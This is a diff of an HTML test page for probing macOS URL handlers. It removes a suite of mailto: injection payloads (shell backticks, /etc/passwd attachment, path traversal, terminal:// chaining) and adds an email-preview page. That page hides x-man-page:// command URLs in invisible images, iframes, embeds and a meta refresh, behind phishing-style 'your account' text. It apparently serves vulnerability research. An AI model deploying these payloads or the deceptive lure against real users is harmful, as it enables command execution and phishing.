@@ -1,335 +1,57 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>mailto: URL Handler Exploit Tests</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        .test-section {
-            background: white;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 20px 0;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        .test-case {
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            padding: 15px;
-            margin: 10px 0;
-            background: #fafafa;
-        }
-        .danger {
-            border-left: 4px solid #ff3b30;
-            background: #fff5f5;
-        }
-        .warning {
-            border-left: 4px solid #ff9500;
-            background: #fff9f0;
-        }
-        .info {
-            border-left: 4px solid #007aff;
-            background: #f0f8ff;
-        }
-        button {
-            background: #007aff;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 6px;
-            cursor: pointer;
-            margin: 5px;
-            font-size: 14px;
-        }
-        button:hover {
-            background: #0056cc;
-        }
-        button.danger {
-            background: #ff3b30;
-        }
-        button.danger:hover {
-            background: #cc2a22;
-        }
-        code {
-            background: #eee;
-            padding: 2px 6px;
-            border-radius: 3px;
-            font-family: 'Monaco', 'Menlo', monospace;
-            font-size: 12px;
-        }
-        .result {
-            margin-top: 10px;
-            padding: 10px;
-            border-radius: 4px;
-            display: none;
-        }
-        .success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-    </style>
+    <title>Auto-Preview Exploit Test</title>
 </head>
 <body>
-    <h1>mailto: URL Handler Exploit Tests</h1>
-    <p><strong>WARNING:</strong> Only run these tests in an isolated macOS VM environment. Some tests may cause unexpected behavior.</p>
-
-    <!-- Section 1: Basic mailto Injection -->
-    <div class="test-section">
-        <h2>1. Command Injection in mailto: Parameters</h2>
-        
-        <div class="test-case danger">
-            <h3>Test 1A: Argument Injection</h3>
-            <p>Attempts to inject command-line arguments into Mail.app</p>
-            <button onclick="testMailto('mailto:test@test.com?subject=-e%20%22tell%20application%20\\\"Terminal\\\"%20to%20activate%22')">
-                Test Argument Injection
-            </button>
-            <div id="result1A" class="result"></div>
-        </div>
-
-        <div class="test-case danger">
-            <h3>Test 1B: Shell Command Injection</h3>
-            <p>Attempts to execute shell commands through parameter injection</p>
-            <button onclick="testMailto('mailto:test@test.com?body=%60open%20-a%20Calculator%60')">
-                Test Shell Command Injection
-            </button>
-            <div id="result1B" class="result"></div>
-        </div>
-
-        <div class="test-case warning">
-            <h3>Test 1C: Multiple Parameter Exploitation</h3>
-            <p>Uses multiple parameters to confuse the parser</p>
-            <button onclick="testMailto('mailto:test@test.com?subject=test&body=test&cc=test&bcc=test&attachment=/etc/passwd')">
-                Test Parameter Overflow
-            </button>
-            <div id="result1C" class="result"></div>
-        </div>
+    <h1>Important Email Preview Test</h1>
+    
+    <!-- Test 1: Hidden image with man page URL -->
+    <img src="x-man-page://open%20-a%20Calculator" 
+         width="1" height="1" 
+         style="position:absolute; left:-100px;"
+         alt="hidden">
+    
+    <!-- Test 2: CSS background with man page URL -->
+    <div style="background-image: url('x-man-page://ls;echo CSS_BACKGROUND'); 
+                width: 1px; height: 1px; overflow: hidden;">
     </div>
-
-    <!-- Section 2: URL Scheme Escalation -->
-    <div class="test-section">
-        <h2>2. URL Scheme Escalation</h2>
-        
-        <div class="test-case danger">
-            <h3>Test 2A: JavaScript URL in mailto</h3>
-            <p>Attempts to execute JavaScript through mailto handler</p>
-            <button onclick="testMailto('mailto:javascript:alert(1)')">
-                Test JavaScript Execution
-            </button>
-            <div id="result2A" class="result"></div>
-        </div>
-
-        <div class="test-case danger">
-            <h3>Test 2B: File URL Injection</h3>
-            <p>Attempts to access local files through mailto</p>
-            <button onclick="testMailto('mailto:file:///etc/passwd')">
-                Test File URL Access
-            </button>
-            <div id="result2B" class="result"></div>
-        </div>
-
-        <div class="test-case danger">
-            <h3>Test 2C: Terminal URL Chaining</h3>
-            <p>Attempts to chain mailto with terminal:// URL</p>
-            <button onclick="testMailto('mailto:terminal://open?command=echo%20EXPLOITED')">
-                Test Terminal URL Chaining
-            </button>
-            <div id="result2C" class="result"></div>
-        </div>
-    </div>
-
-    <!-- Section 3: Parser Confusion Attacks -->
-    <div class="test-section">
-        <h2>3. Parser Confusion & Encoding Attacks</h2>
-        
-        <div class="test-case warning">
-            <h3>Test 3A: Double Encoding</h3>
-            <p>Uses double URL encoding to bypass filters</p>
-            <button onclick="testMailto('mailto:test%2540test.com?subject=%2522%257C%2520open%2520-a%2520Calculator')">
-                Test Double Encoding
-            </button>
-            <div id="result3A" class="result"></div>
-        </div>
-
-        <div class="test-case warning">
-            <h3>Test 3B: Unicode and Special Characters</h3>
-            <p>Uses Unicode characters to confuse the parser</p>
-            <button onclick="testMailto('mailto:test@test.com?subject=\u202EgnidaeT\u202F\u2066;open -a Terminal;//')">
-                Test Unicode Exploit
-            </button>
-            <div id="result3B" class="result"></div>
-        </div>
-
-        <div class="test-case warning">
-            <h3>Test 3C: Null Byte Injection</h3>
-            <p>Attempts null byte injection in parameters</p>
-            <button onclick="testMailto('mailto:test@test.com%00?subject=injected')">
-                Test Null Byte Injection
-            </button>
-            <div id="result3C" class="result"></div>
-        </div>
-    </div>
-
-    <!-- Section 4: Attachment Exploits -->
-    <div class="test-section">
-        <h2>4. Attachment Parameter Exploits</h2>
-        
-        <div class="test-case danger">
-            <h3>Test 4A: Local File Attachment</h3>
-            <p>Attempts to attach local system files</p>
-            <button onclick="testMailto('mailto:test@test.com?attach=file:///etc/passwd')">
-                Test Local File Attachment
-            </button>
-            <div id="result4A" class="result"></div>
-        </div>
-
-        <div class="test-case danger">
-            <h3>Test 4B: Executable File Reference</h3>
-            <p>Attempts to reference executable files</p>
-            <button onclick="testMailto('mailto:test@test.com?attachment=/bin/zsh')">
-                Test Executable Attachment
-            </button>
-            <div id="result4A" class="result"></div>
-        </div>
-
-        <div class="test-case warning">
-            <h3>Test 4C: Path Traversal in Attachments</h3>
-            <p>Attempts path traversal in attachment parameter</p>
-            <button onclick="testMailto('mailto:test@test.com?attachment=../../../etc/passwd')">
-                Test Path Traversal
-            </button>
-            <div id="result4C" class="result"></div>
-        </div>
-    </div>
-
-    <!-- Section 5: Auto-Execution Tests -->
-    <div class="test-section">
-        <h2>5. Auto-Execution & Auto-Open Tests</h2>
-        
-        <div class="test-case danger">
-            <h3>Test 5A: Auto-Open Command File</h3>
-            <p>Attempts to auto-open .command files</p>
-            <button onclick="testMailto('mailto:test@test.com?attachment=test.command')">
-                Test .command Auto-Open
-            </button>
-            <div id="result5A" class="result"></div>
-        </div>
-
-        <div class="test-case danger">
-            <h3>Test 5B: Auto-Run Script</h3>
-            <p>Attempts to reference auto-run scripts</p>
-            <button onclick="testMailto('mailto:test@test.com?body=open%20x-apple-terminal://')">
-                Test Auto-Run Script
-            </button>
-            <div id="result5B" class="result"></div>
-        </div>
-
-        <div class="test-case info">
-            <h3>Test 5C: Data URL Payload</h3>
-            <p>Uses data URLs to embed executable content</p>
-            <button onclick="testMailto('data:text/html,<script>window.open(\"terminal://open\")</script>')">
-                Test Data URL Payload
-            </button>
-            <div id="result5C" class="result"></div>
-        </div>
-    </div>
-
-    <!-- Monitoring Section -->
-    <div class="test-section">
-        <h2>Monitoring & Results</h2>
-        <div class="test-case info">
-            <h3>Test Status</h3>
-            <p>Monitor Console.app for Mail.app errors and check for unexpected Terminal launches.</p>
-            <button onclick="checkForSuccess()">Check for Success Markers</button>
-            <div id="monitoringResults" class="result"></div>
-        </div>
-    </div>
-
+    
+    <!-- Test 3: Object tag -->
+    <object data="x-man-page://test" 
+            type="text/plain"
+            style="display:none">
+    </object>
+    
+    <!-- Test 4: Embed tag -->
+    <embed src="x-man-page://embed_test" 
+           style="display:none">
+    
+    <!-- Test 5: Iframe (less likely but worth testing) -->
+    <iframe src="x-man-page://iframe_test" 
+            style="display:none"
+            onload="console.log('iframe loaded')">
+    </iframe>
+    
+    <!-- Test 6: JavaScript that might run during preview -->
     <script>
-        // Track test results
-        let testResults = {};
-        let testCounter = 0;
-
-        function testMailto(mailtoUrl) {
-            testCounter++;
-            const testId = 'test' + testCounter;
-            testResults[testId] = {
-                url: mailtoUrl,
-                timestamp: new Date().toISOString(),
-                status: 'executed'
-            };
-
-            try {
-                console.log('Testing mailto URL:', mailtoUrl);
-                
-                // Method 1: Direct window.location
-                // window.location.href = mailtoUrl;
-                
-                // Method 2: Create and click a link (more reliable)
-                const link = document.createElement('a');
-                link.href = mailtoUrl;
-                link.style.display = 'none';
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                
-                // Method 3: Use window.open as fallback
-                // window.open(mailtoUrl, '_blank');
-                
-                showResult(testId, 'Test executed successfully. Check for Terminal launch or Mail.app behavior.', 'success');
-                
-            } catch (error) {
-                showResult(testId, 'Error executing test: ' + error.message, 'error');
-            }
-            
-            // Log to console for debugging
-            console.log('Test executed:', mailtoUrl);
-        }
-
-        function showResult(testId, message, type) {
-            const resultDiv = document.getElementById(testId);
-            if (resultDiv) {
-                resultDiv.textContent = message;
-                resultDiv.className = 'result ' + type;
-                resultDiv.style.display = 'block';
-            }
-        }
-
-        function checkForSuccess() {
-            const resultsDiv = document.getElementById('monitoringResults');
-            let message = 'Monitoring Results:\n\n';
-            
-            message += 'Check for these indicators:\n';
-            message += '• Terminal.app launched automatically\n';
-            message += '• Mail.app crashed or showed errors\n';
-            message += '• Calculator.app opened unexpectedly\n';
-            message += '• Check Console.app for Mail process errors\n';
-            message += '• Look for new processes in Activity Monitor\n\n';
-            
-            message += 'Tests executed: ' + testCounter + '\n';
-            message += 'Last test: ' + (testCounter > 0 ? testResults['test' + testCounter].timestamp : 'None');
-            
-            resultsDiv.textContent = message;
-            resultsDiv.className = 'result info';
-            resultsDiv.style.display = 'block';
-        }
-
-        // Auto-logging
-        console.log('mailto: Exploit Test Suite Loaded');
-        console.log('User Agent:', navigator.userAgent);
-        console.log('Platform:', navigator.platform);
+        // Some email clients might execute simple scripts during preview
+        console.log('Preview script executed');
     </script>
+    
+    <!-- Test 7: Meta refresh -->
+    <meta http-equiv="refresh" content="0;url=x-man-page://meta_refresh">
+    
+    <!-- Test 8: Link tag -->
+    <link rel="stylesheet" href="x-man-page://link_tag">
+    
+    <!-- Visible content to make email look legitimate -->
+    <p>Please review the attached document. This email contains important information about your account.</p>
+    <p>If you have any questions, please contact support.</p>
+    
+    <!-- Normal-looking link that might be auto-activated -->
+    <a href="x-man-page://normal_link" style="color: blue; text-decoration: underline;">
+        Click here to view document
+    </a>
 </body>
 </html>
